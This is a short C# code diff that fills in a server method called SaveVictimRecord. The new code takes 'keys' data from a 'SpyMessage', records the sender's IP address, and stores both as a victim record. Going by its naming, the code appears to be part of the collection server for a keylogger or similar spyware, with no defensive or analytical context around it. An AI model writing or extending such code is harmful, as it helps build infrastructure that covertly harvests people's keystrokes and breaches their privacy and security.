@@ -17,7 +17,15 @@ namespace Server.Handlers
 
         public async Task<string> SaveVictimRecord(SpyMessage message, ClientInfo clientInfo)
         {
-            // logic to save victim record data
+
+            string keys = message.GetOption("keys");
+            string ip = clientInfo.RemoteEndPoint.ToString().Split(":")[0];
+
+            if (string.IsNullOrEmpty(keys))
+                return _director.GetBadRequestResponse().ToString();
+
+
+            Data.RecordsContainer.AddRecord(keys, ip);
 
             return _director.GetSuccessResponse().ToString();
         }
